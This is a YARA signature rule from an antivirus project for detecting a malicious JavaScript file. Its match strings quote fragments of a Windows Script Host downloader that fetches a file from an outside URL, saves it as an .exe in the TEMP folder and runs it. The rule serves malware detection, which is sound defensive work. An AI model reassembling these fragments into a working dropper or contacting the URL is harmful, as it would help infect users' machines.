rule sig_20160330_6af94330954be61bcd3c30863c707ae8 {
  meta:
    description = "datamaliciousorder - file 20160330_6af94330954be61bcd3c30863c707ae8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "252aca33300dd4705c4a35ce08cd5e95e8369bf75284285da6f3b21439fa2ab8"

  strings:
    $s1  = "var TH = function BA() {return WScript[A](\"WScript\"+\".Shell\");}(), WP = 11;" fullword ascii
    $s2  = "Y[G](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s3  = "function V(N, UB){XO = XO * 1; return N - UB;};" fullword ascii
    $s4  = "if (Y[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function F() {return TH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2chbYkBEyZBdSgb.ex\" + \"e\";};" fullword ascii
    $s6  = "function TO(){return ZM + \"\";};" fullword ascii
    $s7  = "function I(IG){TH[\"Run\"](IG, XO, XO);};" fullword ascii
    $s8  = "function SO() {return ((B == true) && (B == R)) ? 1 : XO;};" fullword ascii
    $s9  = "}while (S);" fullword ascii
    $s10 = "var IH = new this[\"Date\"]();" fullword ascii
    $s11 = "function XI()" fullword ascii
    $s12 = "return V(PH, W);" fullword ascii
    $s13 = "function VY(){return A;};" fullword ascii
    $s14 = "function NE(BO) {var IM = (1, 2, 3, 4, 5, BO); return IM;};" fullword ascii
    $s15 = "function KX(){return 22;};" fullword ascii
    $s16 = "var B = false;" fullword ascii
    $s17 = "B = true; " fullword ascii
    $s18 = "var U = false;" fullword ascii
    $s19 = "} catch(MT){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}